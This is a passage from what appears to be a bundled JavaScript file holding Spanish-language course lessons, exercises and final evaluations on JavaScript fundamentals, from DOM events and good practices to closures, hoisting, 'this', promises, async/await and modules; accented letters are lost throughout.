caja.style.display = "none"; // Ocultar
\`\`\`

## 5. Crear y Agregar Elementos

\`\`\`javascript
// 1. Crear
const nuevoParrafo = document.createElement("p");
nuevoParrafo.innerText = "Soy nuevo aqu";

// 2. Agregar al body
document.body.appendChild(nuevoParrafo);
\`\`\`

**Nota:** Manipular el DOM es "caro" (lento) para el navegador. Hazlo solo cuando sea necesario.
`,completed:!1},{id:"js-junior-eventos",title:"Eventos (Escuchando al usuario)",level:"junior",content:`# Leccin 12: Eventos (Escuchando al usuario)

## 1. Accin y Reaccin

Un evento es algo que sucede en el navegador: un click, mover el mouse, presionar una tecla, cargar la pgina.
Podemos escribir cdigo que "escuche" esos eventos y reaccione.

## 2. \`addEventListener\` (El Escucha)

Es la forma correcta de manejar eventos.

\`elemento.addEventListener("evento", funcion_a_ejecutar);\`

\`\`\`javascript
const boton = document.getElementById("miBoton");

function dispararAlerta() {
    alert("Hiciste click!");
}

// Cuando ocurra un 'click' en 'boton', ejecuta 'dispararAlerta'
boton.addEventListener("click", dispararAlerta);
\`\`\`
*Nota: Pasamos \`dispararAlerta\` SIN parntesis \`()\`. Si pones parntesis, se ejecuta inmediatamente al cargar la pgina, no al hacer click.*

## 3. Eventos Comunes

*   \`click\`: Click del mouse.
*   \`submit\`: Enviar un formulario.
*   \`keydown\`: Presionar una tecla.
*   \`input\`: Escribir en un campo de texto.
*   \`mouseenter\`: El mouse entra en el elemento.

## 4. El objeto \`event\` (Informacin del evento)

La funcin que maneja el evento recibe un regalo: un objeto con detalles de qu pas.

\`\`\`javascript
document.addEventListener("keydown", (event) => {
    console.log(\`Presionaste la tecla: \${event.key}\`);
});
\`\`\`

## 5. Mini Ejercicio (Interactivo)
En tu HTML imaginario hay un botn \`<button id="luz">Prender/Apagar</button>\`.
Escribe un script que:
1.  Seleccione el botn.
2.  Al hacer click, cambie el fondo del \`document.body\` de negro a blanco (y viceversa).
`,completed:!1},{id:"js-junior-buenas-practicas",title:"Buenas Prcticas (Junior PRO)",level:"junior",content:`# Leccin 13: Buenas Prcticas (Junior PRO)

## 1. Tu "Yo del futuro" te odiar

Escribir cdigo que funciona es fcil. Escribir cdigo limpio es lo difcil. S amable con tu "yo del futuro" que leer esto en 6 meses.

## 2. Comentarios Inteligentes

No comentes lo obvio. Comenta el **POR QU**, no el CMO.

\`\`\`javascript
// MAL
let edad = 20; // Asigna 20 a edad

// BIEN
// Necesitamos 20 aos porque es el mnimo legal en este pas
let edadMinima = 20;
\`\`\`

## 3. Naming (El arte de nombrar)

Las variables y funciones deben decir qu hacen sin leer el cdigo.

*   Mal: \`function p(n) { ... }\`
*   Bien: \`function calcularPrecio(cantidad) { ... }\`

Usa verbos para funciones (\`getUsuario\`, \`setNombre\`, \`isValido\`).

## 4. DRY (Don't Repeat Yourself)

No te repitas. Si copias y pegas el mismo bloque de cdigo 3 veces, crea una funcin.
Menos cdigo = Menos bugs.

## 5. Indentacin y Formato

Usa un formateador automtico (como Prettier).
El cdigo desordenado es imposible de leer y esconde errores.

\`\`\`javascript
// HORRIBLE
if(true){console.log("hola");
}else{
console.log("chau");}

// HERMOSO
if (true) {
    console.log("hola");
} else {
    console.log("chau");
}
\`\`\`

## 6. Console.log al final

Borra tus \`console.log\` de depuracin antes de "entregar" tu cdigo o subirlo a produccin. No ensucies la consola del usuario.

## 7. Cierre del curso Junior

Felicidades! Tienes las bases.
Siguientes pasos:
*   Practicar mucho manipulando el DOM.
*   Aprender sobre Asincrona (Promesas, Fetch).
*   Eventualmente, aprender un Framework (React, Vue).
Pero primero, domina el Vanilla JS!
`,completed:!1},{id:"js-junior-exercises",title:"Ejercicios Prcticos: JS Junior",level:"junior",content:`# Ejercicios Prcticos: JavaScript Junior

Estos ejercicios estn diseados para poner a prueba tus conocimientos sobre variables, funciones, condicionales, bucles, DOM y eventos.

**Instrucciones Generales:**
1.  Crea un archivo \`.html\` y un \`.js\` separados para cada ejercicio (o un solo HTML con varias secciones).
2.  Usa \`console.log\` para depurar si algo no funciona.
3.  Intenta resolverlo por tu cuenta antes de buscar ayuda.

---

## Ejercicio 1: El Contador Interactivo

**Objetivo:** Manipular el DOM y usar variables para guardar estado.

**Consigna:**
Crea una pgina con:
1.  Un ttulo \`<h1>\` que muestre un nmero (empieza en 0).
2.  Un botn "Incrementar" (+).
3.  Un botn "Decrementar" (-).
4.  Un botn "Resetear" (volver a 0).

**Requisitos:**
*   Al hacer click en (+), el nmero debe subir.
*   Al hacer click en (-), el nmero debe bajar.
*   Si el nmero es positivo, pinto el texto de **verde**.
*   Si el nmero es negativo, pinto el texto de **rojo**.
*   Si es cero, el texto se queda **negro**.

---

## Ejercicio 2: La Calculadora Bsica

**Objetivo:** Funciones, Inputs y conversin de tipos.

**Consigna:**
Crea un formulario simple con:
1.  Un input numrico (Nmero A).
2.  Un input numrico (Nmero B).
3.  Cuatro botones (+, -, *, /).
4.  Un prrafo vaco \`<p id="resultado">\` para mostrar el resultado.

**Requisitos:**
*   Al tocar un botn, debe realizar la operacin matemtica correspondiente entre A y B.
*   Muestra el resultado en el prrafo: "El resultado es: X".
*   **Validacin:** Si alguno de los inputs est vaco, muestra una alerta: "Por favor ingresa ambos nmeros".
*   *Pista: Recuerda que \`input.value\` siempre devuelve texto (String), necesitars convertirlo a Number.*

---

## Ejercicio 3: Validacin de Password

**Objetivo:** Eventos de input y condicionales.

**Consigna:**
Crea un input de tipo \`password\` y un mensaje de ayuda debajo.

**Requisitos:**
*   Mientras el usuario escribe (evento \`input\`), valida en tiempo real:
    1.  Si tiene menos de 8 caracteres, muestra el mensaje "Muy corta" en **rojo**.
    2.  Si tiene 8 o ms caracteres, muestra "Longitud correcta" en **verde**.
*   Agrega un "Ojo" (botn o cono) al lado.
    *   Al hacer click, el input debe pasar de \`type="password"\` a \`type="text"\` (para ver la contrasea) y viceversa.

---

## Ejercicio 4: To-Do List Simple

**Objetivo:** Arrays, crear elementos del DOM dinmicamente.

**Consigna:**
Crea una lista de tareas.
1.  Un input para escribir la tarea.
2.  Un botn "Agregar".
3.  Una lista \`<ul>\` vaca.

**Requisitos:**
*   Al hacer click en "Agregar", se debe crear un nuevo \`<li>\` con el texto del input y agregarlo a la \`<ul>\`.
*   El input debe limpiarse automticamente despus de agregar.
*   **Bonus:** Al hacer click sobre una tarea de la lista (\`li\`), esta debe cambiar su estilo (ej: tachado \`text-decoration: line-through\`) para marcarla como completada.

---

## Ejercicio 5: El Adivinador

**Objetivo:** Lgica de juego y \`Math.random()\`.

**Consigna:**
El programa debe elegir un nmero aleatorio entre 1 y 100 al cargar la pgina (sa \`Math.random\`).
El usuario tiene un input para intentar adivinarlo.

**Requisitos:**
*   Si el usuario adivina, muestra "Ganaste!" en verde.
*   Si el nmero del usuario es menor al secreto, muestra "Ms alto...".
*   Si el nmero del usuario es mayor al secreto, muestra "Ms bajo...".
*   Cuenta cuntos intentos le tom y mustralo al final.

---

A codear! 
`,completed:!1,isProject:!0},{id:"js-junior-eval",title:"Evaluacin Final: Junior",level:"junior",content:'# Evaluacin Final: JavaScript Junior\n\nEsta evaluacin mide tu comprensin de los fundamentos de JavaScript: lgica, manipulacin del DOM y manejo de eventos.\n\n## Seccin 1: Teora (Responde brevemente)\n\n1.  **Explica la diferencia entre `let`, `const` y `var`. Por qu deberas evitar `var`?**\n2.  **Qu es el DOM y para qu sirve `document.querySelector`?**\n3.  **Cul es la diferencia entre `==` y `===`? Da un ejemplo donde den resultados distintos.**\n4.  **Si tengo un array `frutas = ["Manzana", "Banana"]`, Cmo agrego "Pera" al final?**\n5.  **Qu hace `event.preventDefault()` en un formulario?**\n\n## Seccin 2: Prctica - "El Interruptor Mgico"\n\nCrea un archivo HTML con un `div` cuadrado (100x100px) de color rojo y un botn "Magia".\n\n**Requisitos JavaScript:**\n1.  Al hacer click en el botn, el cuadrado debe cambiar su color de fondo a **Azul**.\n2.  Al hacer click otra vez, debe volver a **Rojo** (toggle).\n3.  Si el usuario pasa el mouse POR ENCIMA del cuadrado (`mouseenter`), muestra un mensaje en consola: "Ests tocando el cuadrado".\n\n## Seccin 3: Algoritmia Bsica\n\nEscribe una funcin `esPar(numero)` que reciba un nmero y devuelva `true` si es par y `false` si es impar.\n*   Prueba: `esPar(2)` -> true\n*   Prueba: `esPar(5)` -> false\n\n## Criterios de Aprobacin\n\n*   [ ] Cdigo limpio y debidamente identado.\n*   [ ] Uso correcto de `const` y `let` (no `var`).\n*   [ ] La lgica del toggle (interruptor) funciona siempre, no solo una vez.\n*   [ ] La funcin de par/impar usa el operador mdulo (`%`).\n',completed:!1,isProject:!0},{id:"js-ss-scope-lexical",title:"Scope y Lexical Environment (El Alcance Real)",level:"semi-senior",content:`# Leccin 14: Scope y Lexical Environment (El Alcance Real)

## 1. Ms all de Global y Local

Como Junior, sabes que las variables dentro de una funcin no se ven desde fuera.
Como Semi-Senior, debes entender **por qu**.

El **Lexical Environment** (Entorno Lxico) es la estructura interna que JS usa para rastrear identificadores (variables/funciones) y sus referencias.
Se compone de dos partes:
1.  **Environment Record:** Donde se guardan las variables actuales (\`const a = 1\`).
2.  **Reference to Outer Environment:** Un enlace al entorno "padre".

## 2. La Cadena de Scope (Scope Chain)

Cuando pides una variable, JS busca as:
1.  Est en mi Environment Record actual? -> S: sala.
2.  No -> Ve al Outer Environment (padre).
3.  Est ah? -> S: sala.
4.  No -> Sigue subiendo hasta llegar al Global.
5.  No est en Global -> \`ReferenceError\`.

A esto se le llama **Lexical Scoping** (Alcance Esttico): El alcance se define por **dnde escribiste el cdigo**, no por dnde se llama.

## 3. Ejemplo Trampa (Entiendes el alcance?)

\`\`\`javascript
const x = 10;

function foo() {
    console.log(x);
}

function bar() {
    const x = 20;
    foo(); // Qu imprime?
}

bar();
\`\`\`

**Respuesta:** Imprime \`10\`.
**Por qu:**
\`foo\` fue definida en el entorno Global. Su "Outer Environment" es Global.
No importa que la llames desde \`bar\`. Cuando \`foo\` busca \`x\`:
1.  Busca en su adrentro. No est.
2.  Busca en su Outer (Global). Ah \`x\` es 10.
3.  La \`x = 20\` de \`bar\` es invisible para \`foo\` porque \`bar\` NO es el entorno padre de \`foo\` (no fue definida dentro de \`bar\`).

## 4. Shadowing (Sombra)

Si declaras una variable con el mismo nombre que una del padre, la "tapas" (haces sombra).

\`\`\`javascript
let nombre = "Global";

function prueba() {
    let nombre = "Local"; // Shadowing
    console.log(nombre); // "Local"
}
\`\`\`

## 5. Ejercicio "Rompecocos"
Analiza el siguiente cdigo antes de ejecutarlo. Qu valor tiene \`a\` en cada console.log?

\`\`\`javascript
let a = 1;

function b() {
    a = 10; // CUIDADO: No tiene let/var/const. Reasigna la global.
    return;
    function a() {} // Hoisting de funcin!
}

b();
console.log(a); // 1  10  function?
\`\`\`
*Pista: El hoisting de funciones dentro de un bloque afecta cmo se resuelven los nombres.*
`,completed:!1},{id:"js-ss-closures",title:"Closures (Mochilas de Datos)",level:"semi-senior",content:`# Leccin 15: Closures (Mochilas de Datos)

## 1. La Mochila Invisible

Un **Closure** ocurre cuando una funcin "recuerda" el entorno lxico en el que fue creada, incluso cuando se ejecuta fuera de ese entorno.

Imagina que la funcin lleva una "mochila" con todas las variables que existan cuando naci.

## 2. El Patrn Factory

\`\`\`javascript
function crearContador() {
    let count = 0; // Privado (en la mochila)

    return function() {
        count++; // Accede a la mochila
        console.log(count);
    };
}

const contadorA = crearContador();
contadorA(); // 1
contadorA(); // 2

const contadorB = crearContador(); // Nueva mochila
contadorB(); // 1 (Independiente de A)
\`\`\`

## 3. Caso Real: Emular Privacidad

JS (antes de \`#privateFields\`) no tena variables privadas. Usamos closures.

\`\`\`javascript
function Usuario(nombreInicial) {
    let _nombre = nombreInicial; // "Privado" por convencin y closure

    return {
        getNombre: () => _nombre,
        setNombre: (nuevo) => {
            if (nuevo.length > 0) _nombre = nuevo;
        }
    };
}

const user = Usuario("Pepe");
console.log(user.getNombre()); // "Pepe"
// console.log(user._nombre); // undefined (No accesible directamente)
\`\`\`

## 4. El error clsico del Loop

\`\`\`javascript
// INCORRECTO
for (var i = 1; i <= 3; i++) {
    setTimeout(function() {
        console.log(i);
    }, 1000);
}
// Resultado: 4, 4, 4 (Desastre!)
\`\`\`
**Por qu:** \`var\` tiene scope de funcin (o global), no de bloque. \`i\` es la misma variable compartida. Cuando el \`setTimeout\` se dispara 1 segundo despus, el loop ya termin y \`i\` vale 4.

**Solucin Correcta:**
Usar \`let\` (Scope de bloque). Crea una \`i\` nueva en cada vuelta.
\`\`\`javascript
for (let i = 1; i <= 3; i++) {
    setTimeout(() => console.log(i), 1000);
}
// Resultado: 1, 2, 3
\`\`\`

## 5. Ejercicio: Memorizacin (Cache)
Crea una funcin \`memoize(fn)\` que reciba una funcin lenta y devuelva una nueva funcin que guarde los resultados.
Si llamo a \`lenta(5)\` y tarda 2s, la prxima vez que llame a \`lenta(5)\` debe ser instantneo (devolver desde cache).

*Tip: Tu closure debe tener un objeto \`cache = {}\`.*
`,completed:!1},{id:"js-ss-hoisting",title:"Hoisting (Elevacin Fantasma)",level:"semi-senior",content:`# Leccin 16: Hoisting (Elevacin Fantasma)

## 1. Magia Negra?

Hoisting es el comportamiento donde declaraciones de variables y funciones son "movidas" (en memoria) al inicio de su scope antes de ejecutar el cdigo.

## 2. Funciones: Declaracin vs Expresin

### Function Declaration (Se eleva completa)
\`\`\`javascript
saludar(); // Funciona: "Hola"

function saludar() {
    console.log("Hola");
}
\`\`\`

### Function Expression (Se eleva la variable, pero como undefined/error)
\`\`\`javascript
saludar(); // Error: saludar is not a function (si es var) o ReferenceError (si es const)

var saludar = function() { // o const
    console.log("Hola");
};
\`\`\`

## 3. Variables: var vs let/const

### Con \`var\`: undefined
\`\`\`javascript
console.log(x); // undefined (No explota, pero da valor errneo)
var x = 5;
\`\`\`
JS lo interpreta as:
\`\`\`javascript
var x;
console.log(x);
x = 5;
\`\`\`

### Con \`let\` / \`const\`: TDZ (Temporal Dead Zone)
\`\`\`javascript
console.log(y); // ReferenceError: Cannot access 'y' before initialization
let y = 10;
\`\`\`
Aunque la variable "se eleva", entra en la **Zona Muerta Temporal**. Es ilegal tocarla hasta llegar a su lnea de declaracin.

## 4. Por qu importa? (Bug Real)

\`\`\`javascript
var favorita = "Pizza";

function comer() {
    console.log("Comiendo " + favorita); // "Comiendo Pizza"? NO! -> "Comiendo undefined"
    var favorita = "Hamburguesa";
}
comer();
\`\`\`
**Explicacin:** Dentro de \`comer\`, hay una \`var favorita\`. El hoisting la sube al inicio de la funcin como \`undefined\`, tapando (shadowing) a la global "Pizza".
El \`console.log\` usa la local (undefined) antes de que se asigne "Hamburguesa".

## 5. Ejercicio de Confusin
Predice el output sin ejecutar:

\`\`\`javascript
function test() {
    console.log(a);
    console.log(foo());
    
    var a = 1;
    function foo() {
        return 2;
    }
}
test();
\`\`\`
`,completed:!1},{id:"js-ss-this",title:"this (Contexto de Ejecucin)",level:"semi-senior",content:`# Leccin 17: this (Contexto de Ejecucin)

## 1. La Pesadilla de \`this\`

\`this\` NO es esttico. Depende de **CMO** se llama a la funcin, no de dnde se crea (al revs que las variables).

## 2. Las 4 Reglas de \`this\`

1.  **Enlazado por defecto (Global):**
    Si llamas \`funcion()\`, \`this\` es el objeto global (\`window\`). En modo estricto (\`"use strict"\`), es \`undefined\`.

2.  **Enlazado Implcito (Mtodo):**
    Si llamas \`objeto.funcion()\`, \`this\` es el \`objeto\` (lo que est a la izquierda del punto).

3.  **Enlazado Explcito (Call, Apply, Bind):**
    T le dices quin es.
    \`funcion.call(miObjeto, arg1)\`

4.  **Constructor (new):**
    Si usas \`new Funcion()\`, \`this\` es el nuevo objeto creado.

## 3. El caso especial: Arrow Functions

Las Arrow Functions **NO tienen su propio \`this\`**.
Lo toman prestado de su entorno lxico (Scope padre).

\`\`\`javascript
const obj = {
    nombre: "Objeto",
    normal: function() { console.log(this.nombre); },
    flecha: () => { console.log(this.nombre); }
};

obj.normal(); // "Objeto"
obj.flecha(); // undefined (toma el this del scope global)
\`\`\`

## 4. El Bug Clsico: Perder el contexto

\`\`\`javascript
const usuario = {
    nombre: "Juan",
    hablar() {
        console.log(\`Soy \${this.nombre}\`);
    }
};

setTimeout(usuario.hablar, 1000); // "Soy undefined"
\`\`\`
**Por qu:** \`setTimeout\` recibe la *referencia* a la funcin \`hablar\`. Cuando la ejecuta 1s despus, la llama como una funcin normal \`hablar()\`, no como mtodo \`usuario.hablar()\`. Se aplica la Regla 1 (Global).

**Solucin:** \`.bind(usuario)\` o Arrow function envolvente.
\`\`\`javascript
setTimeout(() => usuario.hablar(), 1000); // Funciona
\`\`\`

## 5. Ejercicio
Corrige este cdigo para que funcione:
\`\`\`javascript
const contador = {
    cuenta: 0,
    iniciar: function() {
        setInterval(function() {
            this.cuenta++; // this es window aqu dentro :(
            console.log(this.cuenta);
        }, 1000);
    }
};
contador.iniciar(); // Imprime NaN
\`\`\`
*Solucin sugerida: Cambiar la function interna del setInterval por una Arrow Function.*
`,completed:!1},{id:"js-ss-higher-order-functions",title:"Funciones de Orden Superior (HOF)",level:"semi-senior",content:`# Leccin 18: Funciones de Orden Superior (HOF)

## 1. Funciones como Datos

En JS, las funciones son "Ciudadanos de Primera Clase". Puedes guardarlas en variables, pasarlas como argumentos y retornarlas.

Una **Higher Order Function** es una funcin que:
1.  Recibe una o ms funciones como argumento.
2.  Y/O devuelve una funcin.

## 2. Array Methods (Tus mejores amigos)

Deja de usar \`for\` loops para todo. Usa HOF declarativas.

*   \`map\`: Transforma cada elemento. Entra Array[N] -> Sale Array[N].
*   \`filter\`: Filtra elementos. Entra Array[N] -> Sale Array[<=N].
*   \`reduce\`: Reduce todo a un solo valor. Entra Array[N] -> Sale Valor.
*   \`forEach\`: Efectos secundarios (no devuelve nada).

## 3. Ejemplo: Transformacin de Datos

\`\`\`javascript
const pedidos = [
    { id: 1, total: 100, estado: 'pagado' },
    { id: 2, total: 200, estado: 'pendiente' },
    { id: 3, total: 50, estado: 'pagado' }
];

// Quiero el total de dinero de pedidos pagados

// Imperativo (Feo)
let total = 0;
for(let i=0; i<pedidos.length; i++) {
    if(pedidos[i].estado === 'pagado') {
        total += pedidos[i].total;
    }
}

// Declarativo (Hermoso - Encadenamiento)
const totalDeclarativo = pedidos
    .filter(p => p.estado === 'pagado')
    .map(p => p.total) // Opcional, solo para aislar montos
    .reduce((acumulador, actual) => acumulador + actual, 0);
\`\`\`

## 4. Crear tus propias HOF

\`\`\`javascript
function logger(fn) {
    return function(...args) {
        console.log("Ejecutando funcin con:", args);
        const resultado = fn(...args);
        console.log("Resultado:", resultado);
        return resultado;
    };
}

const suma = (a,b) => a+b;
const sumaLogueada = logger(suma);

sumaLogueada(5, 3); // Logs automticos
\`\`\`

## 5. Ejercicio
Tienes un array de strings: \`["hola", "mundo", "javascript", "genial"]\`.
Usa \`filter\` y \`map\` para obtener:
1.  Solo las palabras de ms de 4 letras.
2.  Convertidas a MAYSCULAS.
Resultado: \`["MUNDO", "JAVASCRIPT", "GENIAL"]\`.
`,completed:!1},{id:"js-ss-callbacks",title:"Callbacks (Llamadas de vuelta)",level:"semi-senior",content:`# Leccin 19: Callbacks (Llamadas de vuelta)

## 1. Qu es un Callback?

Es simplemente una funcin que pasas como argumento a otra funcin, para que sea ejecutada ("llamada de vuelta") ms tarde.

\`\`\`javascript
function procesarUsuario(id, callback) {
    console.log("Buscando usuario " + id);
    // Simulamos tiempo
    setTimeout(() => {
        const usuario = { id: id, nombre: "Ana" };
        callback(usuario); // Aqu se ejecuta el callback!
    }, 1000);
}

// Uso
procesarUsuario(1, (user) => {
    console.log("Usuario encontrado:", user.nombre);
});
\`\`\`

## 2. Inversin de Control

El problema de los callbacks es que le das el control de TU cdigo a una funcin externa. Confas en que llamar a tu callback:
1.  Solo una vez.
2.  Sin errores.
3.  En el momento correcto.

## 3. Callback Hell (Infierno de Callbacks)

Cuando tienes operaciones dependientes.
1. Buscar Usuario -> 2. Buscar sus Pedidos -> 3. Buscar Detalle Pedido.

\`\`\`javascript
getUser(1, (user) => {
    getOrders(user.id, (orders) => {
        getOrderDetails(orders[0].id, (details) => {
            console.log(details); // Forma de pirmide (Hadouken code)
        });
    });
});
\`\`\`
Es difcil de leer y difcil de manejar errores (tendras que tener un \`if (error)\` en cada nivel).

## 4. Ejercicio
Simula el Callback Hell.
Crea 3 funciones: \`paso1(cb)\`, \`paso2(cb)\`, \`paso3(cb)\`. Cada una debe usar \`setTimeout\` para tardar 1s y luego llamar al callback.
Ejectalas en orden secuencial (Paso 1 termina -> Paso 2 empieza...).
`,completed:!1},{id:"js-ss-promises",title:"Promises (Promesas de futuro)",level:"semi-senior",content:`# Leccin 20: Promises (Promesas de futuro)

## 1. La Solucin a Callbacks

Una **Promise** es un objeto que representa la terminacin (o falla) eventual de una operacin asncrona.
Tiene 3 estados:
1.  **Pending:** Pendiente (esperando).
2.  **Fulfilled / Resolved:** xito (se cumpli).
3.  **Rejected:** Fallo (se rompi la promesa).

## 2. Creando una Promesa

\`\`\`javascript
const miPromesa = new Promise((resolve, reject) => {
    const exito = true;
    
    setTimeout(() => {
        if (exito) {
            resolve("Todo sali bien!");
        } else {
            reject("Hubo un error :(");
        }
    }, 2000);
});
\`\`\`

## 3. Consumiendo una Promesa (\`.then\`, \`.catch\`)

\`\`\`javascript
miPromesa
    .then((mensaje) => {
        console.log("xito:", mensaje);
        return "Dato extra"; // Podemos encadenar otro .then
    })
    .then((extra) => {
        console.log("Cadena:", extra);
    })
    .catch((error) => {
        console.error("Error:", error);
    })
    .finally(() => {
        console.log("Termin (bien o mal)");
    });
\`\`\`

## 4. Ventajas sobre Callbacks
*   **Encadenamiento plano:** Adis pirmide.
*   **Manejo de errores centralizado:** Un solo \`.catch\` al final atrapa errores de cualquier paso anterior.

## 5. \`Promise.all\` y \`Promise.race\`

*   \`Promise.all([p1, p2])\`: Espera que **todas** se cumplan. Si una falla, todo falla. til para peticiones paralelas.
*   \`Promise.race([p1, p2])\`: Se queda con la que termine primero (sea xito o error).

## 6. Ejercicio
Convierte las 3 funciones del ejercicio anterior (\`paso1\`, \`paso2\`, \`paso3\`) para que devuelvan Promesas en lugar de recibir callbacks.
salas encadenadas con \`.then()\`.
`,completed:!1},{id:"js-ss-async-await",title:"Async / Await (Sintaxis dulce)",level:"semi-senior",content:`# Leccin 21: Async / Await (Sintaxis dulce)

## 1. Promesas disfrazadas

\`async/await\` (ES2017) no aade funcionalidad nueva al motor. ES azcar sintctico sobre Promesas. Hace que el cdigo asncrono se *lea* como sncrono.

## 2. Reglas
1.  **async:** Puesto antes de una funcin, asegura que siempre devuelva una Promesa.
2.  **await:** Puesto delante de una Promesa, **pausa** la ejecucin de la funcin hasta que la promesa se resuelva. Solo funciona dentro de funciones \`async\`.

## 3. Comparacin

**Con Promesas:**
\`\`\`javascript
function login() {
    getUser()
        .then(user => getRoles(user))
        .then(roles => console.log(roles))
        .catch(err => console.error(err));
}
\`\`\`

**Con Async/Await:**
\`\`\`javascript
async function login() {
    try {
        const user = await getUser(); // Pausa aqu, parece sncrono
        const roles = await getRoles(user);
        console.log(roles);
    } catch (err) {
        console.error(err); // Usamos try/catch estndar
    }
}
\`\`\`

## 4. El error comn: "Blocking" innecesario

Si tienes dos tareas independientes, no hagas esto:

\`\`\`javascript
// Malo (Secuencial innecesario)
const datos = await getDatos(); // Espera 2s
const usuarios = await getUsuarios(); // Espera 2s
// Total: 4s
\`\`\`

Mejor lanza las promesas juntas:
\`\`\`javascript
// Bueno (Paralelo)
const pDatos = getDatos();
const pUsuarios = getUsuarios();

const datos = await pDatos; // Espera
const usuarios = await pUsuarios; // Probablemente ya lleg
// Total: 2s (el mximo de las dos)
\`\`\`
O usa \`Promise.all\`.

## 5. Ejercicio
Reescribe tu ejercicio de encadenamiento de Promesas usando \`async/await\`.
Asegrate de envolverlo en un \`try/catch\` para manejar errores.
`,completed:!1},{id:"js-ss-error-handling",title:"Manejo de Errores (Defensive Programming)",level:"semi-senior",content:`# Leccin 22: Manejo de Errores (Defensive Programming)

## 1. El cdigo SIEMPRE falla

La red se cae, el usuario introduce datos invlidos, el servidor explota.
Un semi-senior asume el fallo. Un junior asume el xito.

## 2. Try / Catch / Finally

Bloques try-catch atrapan errores sncronos y errores en \`async/await\`.

\`\`\`javascript
try {
    const user = JSON.parse("Esto no es un JSON"); // Lanza error
} catch (error) {
    console.log("Ups, fall el parseo:", error.message);
    // Valor por defecto o reporte
} finally {
    console.log("Esto se ejecuta siempre (limpieza)");
}
\`\`\`

**Cuidado:** \`try/catch\` NO atrapa errores dentro de \`setTimeout\` o Promesas sin await.

\`\`\`javascript
try {
    setTimeout(() => { throw new Error("Boom"); }, 1000);
} catch (e) {
    // NO atrapa nada! El error ocurre en otro ciclo del Event Loop.
}
\`\`\`

## 3. Objetos de Error Personalizados

No lances solo strings (\`throw "Error"\`). Lanza objetos \`Error\`. Tienen Stack Trace (dnde ocurri).

\`\`\`javascript
class DatabaseError extends Error {
    constructor(msg) {
        super(msg);
        this.name = "DatabaseError";
    }
}

if (!db.conectada) {
    throw new DatabaseError("No hay conexin");
}
\`\`\`

## 4. Propagacin vs Manejo

Debo hacer catch aqu o dejarlo pasar?
*   Si puedes arreglar el problema (reintentar, usar valor default) -> **Catch**.
*   Si es crtico y debe detener el flujo para que un nivel superior se entere -> **No Catch (o re-throw)**.

## 5. Ejercicio
Crea una funcin \`dividir(a, b)\`.
1.  Si \`b\` es 0, lanza un error personalizado \`ZeroDivisionError\`.
2.  Si \`a\` o \`b\` no son nmeros, lanza \`TypeError\`.
3.  Usa un bloque try-catch que maneje cada tipo de error con un mensaje distinto.
`,completed:!1},{id:"js-ss-modules",title:"Modularizacin (ES Modules)",level:"semi-senior",content:`# Leccin 23: Modularizacin (ES Modules)

## 1. El fin del Script Spaghetti

Antes tenamos un archivo \`main.js\` de 5000 lneas. Imposible de mantener.
La modularizacin permite dividir el cdigo en archivos pequeos y reutilizables.

## 2. CommonJS (Node.js legacy) vs ES Modules (Estndar Web)

*   CommonJS: \`require()\` / \`module.exports\`.
*   ES Modules: \`import\` / \`export\`. (Nos enfocamos en este).

## 3. Exportar

### Named Export (Exportar con nombre)
Puedes tener varios por archivo.
\`\`\`javascript
// utils.js
export const pi = 3.14;
export function sumar(a, b) { return a + b; }
\`\`\`

### Default Export (Exportar por defecto)
Solo uno por archivo. Ideal para clases o componentes principales.
\`\`\`javascript
// User.js
export default class User { ... }
\`\`\`

## 4. Importar

\`\`\`javascript
// main.js
import { pi, sumar } from './utils.js'; // Named imports
import Usuario from './User.js'; // Default import (puedes cambiarle el nombre)
\`\`\`

## 5. Mdulos y \`<script>\`

En el navegador, para usar import/export, tu script debe tener \`type="module"\`.
\`<script type="module" src="main.js"><\/script>\`

Caractersticas:
*   Tienen \`defer\` automtico (no bloquean renderizado).
*   Tienen **Strict Mode** activado por defecto.
*   Su scope es el mdulo, no global.

## 6. Ejercicio
Simula una estructura de proyecto.
1.  \`math.js\`: Exporta funciones \`sumar\`, \`restar\`.
2.  \`logger.js\`: Exporta por defecto una funcin que haga \`console.log\` con fecha.
3.  \`app.js\`: Importa todo y salo.
*(Nota: En un entorno sin bundler como Vite/Webpack, necesitars un servidor local para que funcionen los modules).*
`,completed:!1},{id:"js-ss-prototypes",title:"Prototipos y Herencia Prototipal",level:"semi-senior",content:`# Leccin 24: Prototipos y Herencia Prototipal

En JS, casi todo es un objeto. Pero JS no usa clases tradicionales de "plano de construccin" como Java. Usa **Prototipos**.

## 1. El objeto [[Prototype]]
Cada objeto en JS tiene un enlace oculto a otro objeto llamado su prototipo. Si buscas una propiedad en un objeto y no est, JS la busca en su prototipo.

\`\`\`javascript
const animal = { come: true };
const conejo = { salta: true };

conejo.__proto__ = animal; // Establecemos el prototipo (Herencia)

console.log(conejo.salta); // true
console.log(conejo.come);  // true (Viene del prototipo!)
\`\`\`

## 2. La Cadena de Prototipos
Esto puede seguir hacia arriba: \`conejo -> animal -> Object.prototype -> null\`.

## 3. Function.prototype
Cuando creas una funcin, ella tiene una propiedad \`prototype\`. Esto es lo que se asigna como \`__proto__\` a los objetos creados con \`new\`.

## 4. Clases vs Prototipos
Las clases de ES6 son "azcar sintctico". Por debajo, siguen funcionando con prototipos.

## 5. Ejercicio
Aade un mtodo \`presentarse()\` al prototipo de \`String\` para que cualquier texto pueda decir: \`"Hola, soy el string: [Texto]"\`.
\`\`\`javascript
String.prototype.presentarse = function() { ... }
\`\`\`
`,completed:!1},{id:"js-ss-eval",title:"Evaluacin Final: Semi-Senior",level:"semi-senior",content:`# Evaluacin Final: JavaScript Semi-Senior

Demuestra tu comprensin profunda del lenguaje: Scope, Asincrona y Manejo de Datos.

## Seccin 1: Teora Avanzada (Responde con cdigo)

1.  **Dibuja o explica la Cadena de Scope:** Si \`a\` no est en una funcin, dnde la busca JS?
2.  **Closures:** Escribe una funcin \`crearContador(n)\` que devuelva un contador que empiece en \`n\` y sume 1 cada vez que se llame.
3.  **This:** Qu valor tiene \`this\` dentro de una Arrow Function si se usa como mtodo de un objeto?
4.  **Promesas:** Qu diferencia hay entre \`Promise.all\` y \`Promise.race\`?
5.  **Qu es el "Hoisting" y cmo afecta a las declaraciones de funcin vs variables?**

## Seccin 2: Prctica - "El Buscador de Usuarios" (Fetch + Async/Await)

Crea una funcin asncrona \`buscarUsuario(id)\` que consuma la API: \`https://jsonplaceholder.typicode.com/users/{id}\`.

**Requisitos:**
1.  Usa \`async/await\` y bloques \`try/catch\`.
2.  Si la peticin es exitosa, devuelve un objeto *limpio*: \`{ nombre: user.name, email: user.email }\`.
3.  Si la API devuelve error 404 (usuario no encontrado), lanza un error personalizado: \`"Usuario no existe"\`.
